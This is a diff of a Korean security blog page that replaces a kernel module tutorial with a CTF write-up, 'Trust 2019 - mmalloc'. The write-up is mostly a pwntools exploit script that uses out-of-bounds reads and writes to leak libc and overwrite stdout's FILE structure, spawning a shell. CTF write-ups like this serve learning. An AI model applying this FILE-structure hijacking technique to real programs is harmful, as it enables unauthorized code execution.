@@ -7,24 +7,20 @@
   
   
   
-  <title>Kernel Module | 귀찮다</title>
+  <title>Trust 2019 - mmalloc | 귀찮다</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="LKM Lodable Kernel Module  LKM이란 커널 내부에서 실행 가능한 모듈을 말한다. 보통 하드웨어의 드라이버나 파일 시스템등의 커널 확장을 위해 쓰인다. 커널 모듈은 다음과 같이 구현할 수 있다.">
-<meta name="keywords" content="pwnable, kernel">
+  <meta name="description" content="edit 메뉴와 show 메뉴에서 oob가 발생한다.  ######leak show 메뉴에서 oob로 libc leak  ######exploit edit 메뉴로 stdout을 덮으면 됨 exploit  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474">
+<meta name="keywords" content="ctf, pwnable">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kernel Module">
-<meta property="og:url" content="https://blog.haklog.xyz/2019/10/23/post-1/index.html">
+<meta property="og:title" content="Trust 2019 - mmalloc">
+<meta property="og:url" content="https://blog.haklog.xyz/2019/05/25/mmaloc/index.html">
 <meta property="og:site_name" content="귀찮다">
-<meta property="og:description" content="LKM Lodable Kernel Module  LKM이란 커널 내부에서 실행 가능한 모듈을 말한다. 보통 하드웨어의 드라이버나 파일 시스템등의 커널 확장을 위해 쓰인다. 커널 모듈은 다음과 같이 구현할 수 있다.">
+<meta property="og:description" content="edit 메뉴와 show 메뉴에서 oob가 발생한다.  ######leak show 메뉴에서 oob로 libc leak  ######exploit edit 메뉴로 stdout을 덮으면 됨 exploit  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://blog.haklog.xyz/image/2.png">
-<meta property="og:image" content="https://blog.haklog.xyz/image/3.png">
-<meta property="og:image" content="https://blog.haklog.xyz/image/4.png">
-<meta property="og:updated_time" content="2019-10-30T00:59:57.128Z">
+<meta property="og:updated_time" content="2019-11-01T02:22:00.353Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Kernel Module">
-<meta name="twitter:description" content="LKM Lodable Kernel Module  LKM이란 커널 내부에서 실행 가능한 모듈을 말한다. 보통 하드웨어의 드라이버나 파일 시스템등의 커널 확장을 위해 쓰인다. 커널 모듈은 다음과 같이 구현할 수 있다.">
-<meta name="twitter:image" content="https://blog.haklog.xyz/image/2.png">
+<meta name="twitter:title" content="Trust 2019 - mmalloc">
+<meta name="twitter:description" content="edit 메뉴와 show 메뉴에서 oob가 발생한다.  ######leak show 메뉴에서 oob로 libc leak  ######exploit edit 메뉴로 stdout을 덮으면 됨 exploit  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474">
   
   
     <link rel="icon" href="/img/one.png">
@@ -248,11 +244,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-post-1" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-mmaloc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2019/10/23/post-1/" class="article-date">
-      <time datetime="2019-10-23T13:53:55.000Z" itemprop="datePublished">2019-10-23</time>
+      <a  href="/2019/05/25/mmaloc/" class="article-date">
+      <time datetime="2019-05-25T02:13:50.000Z" itemprop="datePublished">2019-05-25</time>
 </a>
 
     </div>
@@ -266,7 +262,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Kernel Module
+      Trust 2019 - mmalloc
     </h1>
   
 
@@ -275,10 +271,14 @@
       
       <div class="article-info article-info-post">
         
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/pwnable/">pwnable</a>
+    </div>
+
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-kernel/">pwnable, kernel</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-pwnable/">ctf, pwnable</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -288,29 +288,14 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="LKM"><a href="#LKM" class="headerlink" title="LKM"></a>LKM</h1><blockquote>
-<p>Lodable Kernel Module</p>
-</blockquote>
-<p>LKM이란 커널 내부에서 실행 가능한 모듈을 말한다. 보통 하드웨어의 드라이버나 파일 시스템등의 커널 확장을 위해 쓰인다. 커널 모듈은 다음과 같이 구현할 수 있다.</p>
-<a id="more"></a>
+        <p>edit 메뉴와 show 메뉴에서 oob가 발생한다. </p>
+<p>######leak</p>
+<p>show 메뉴에서 oob로 libc leak </p>
+<p>######exploit</p>
+<p>edit 메뉴로 stdout을 덮으면 됨</p>
+<p>exploit </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./mmalloc"</span>)</span><br><span class="line"><span class="comment">#r = remote('c2w2m2.com', 56746)</span></span><br><span class="line">e = ELF(<span class="string">"./mmalloc"</span>)</span><br><span class="line">l = e.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(<span class="string">"1"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(<span class="string">"2"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, data)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(<span class="string">"3"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(idx))</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(<span class="string">"4"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">-80</span>)</span><br><span class="line"></span><br><span class="line">leak = r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span></span><br><span class="line">log.info(hex(int(u64(leak))))</span><br><span class="line"></span><br><span class="line">leak = int(u64(leak))</span><br><span class="line">base= leak - <span class="number">0x5f1140</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LIBC : "</span> + hex(base))</span><br><span class="line"></span><br><span class="line">stdin = l.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">stderr = l.symbols[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">stdout = l.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">stdfile = <span class="number">0x3c6780</span></span><br><span class="line"></span><br><span class="line">binsh = next(l.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">vtable = base+stdout + <span class="number">0x100</span></span><br><span class="line">stream = <span class="string">""</span></span><br><span class="line">stream += p64(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">stream += p64(base+stdin) + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">stream += p32(<span class="number">0x0a000000</span>)+ p32(<span class="number">0</span>) + p64(base + stdfile) </span><br><span class="line">stream += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>)</span><br><span class="line">stream += p64(base + <span class="number">0x3c47a0</span>) </span><br><span class="line">stream += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffff</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">stream += p64(vtable)</span><br><span class="line">stream += p64(base + stderr) </span><br><span class="line">stream += p64(base + stdout)</span><br><span class="line">stream += p64(base + stdin)</span><br><span class="line">stream += p64(base + <span class="number">0x20b70</span>)</span><br><span class="line">stream += p64(base + <span class="number">0x4526a</span>)* <span class="number">7</span> </span><br><span class="line">stream += p64(base + <span class="number">0x791e0</span>) + p64(<span class="number">0</span>) *<span class="number">20</span></span><br><span class="line">edit(<span class="number">-8</span>, stream)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"Test text"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"Test text."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>init_module : 모듈이 삽입되었을때 실행되는 함수</li>
-<li>cleanup_module : 모듈이 제거되었을때 실행되는 함수</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += sample.o</span><br><span class="line"> </span><br><span class="line">all:</span><br><span class="line">    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</span><br><span class="line"> </span><br><span class="line">clean:</span><br><span class="line">    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</span><br></pre></td></tr></table></figure>
-
-<p><code> $ make </code></p>
-<p><img src="/image/2.png" alt="Alt text"></p>
-<ul>
-<li>insmod<br>커널에 모듈을 삽입하는 명령어이다.</li>
-<li>rmmod 커널에서 모듈을 제거하는 명령어이다.</li>
-</ul>
-<p><code> $ insmod ./test.ko </code> </p>
-<p><code> $ lsmod </code><br><img src="/image/3.png" alt="Alt text"></p>
-<p>커널 메세지 확인<br><code> $ dmesg </code><br><img src="/image/4.png" alt="Alt text"></p>
 
       
     </div>
@@ -319,28 +304,28 @@
   
     
     <div class="copyright">
-        <p><span>제목:</span><a  href="/2019/10/23/post-1/">Kernel Module</a></p>
+        <p><span>제목:</span><a  href="/2019/05/25/mmaloc/">Trust 2019 - mmalloc</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
-        <p><span>발행 시간:</span>2019년10월23일 - 22시53분</p>
-        <p><span>마지막 업데이트:</span>2019년10월30일 - 09시59분</p>
+        <p><span>발행 시간:</span>2019년05월25일 - 11시13분</p>
+        <p><span>마지막 업데이트:</span>2019년11월01일 - 11시22분</p>
     </div>
 
 
 
 <nav id="article-nav">
   
-    <a  href="/2019/10/30/post-3/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a  href="/2019/07/21/DEFCON 2019 speedrun010/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          fsop - basic
+          Defcon 2019 speedrun 010
         
       </div>
     </a>
   
   
-    <a  href="/2019/10/01/Hitcon-2016-babyheap/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hitcon 2016 babyheap</div>
+    <a  href="/2019/05/11/post-2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">File Structure</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -352,7 +337,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">Article directory</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LKM"><span class="toc-number">1.</span> <span class="toc-text">LKM</span></a></li></ol>
+    
 </div>
 <style>
     .left-col .switch-btn {
@@ -448,13 +433,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2019/10/30/post-3/" title="上一篇: fsop - basic">
+            <a  href="/2019/07/21/DEFCON 2019 speedrun010/" title="上一篇: Defcon 2019 speedrun 010">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2019/10/01/Hitcon-2016-babyheap/" title="下一篇: Hitcon 2016 babyheap">
+            <a  href="/2019/05/11/post-2/" title="下一篇: File Structure">
                 <i class="fa fa-angle-right"></i>
             </a>
         
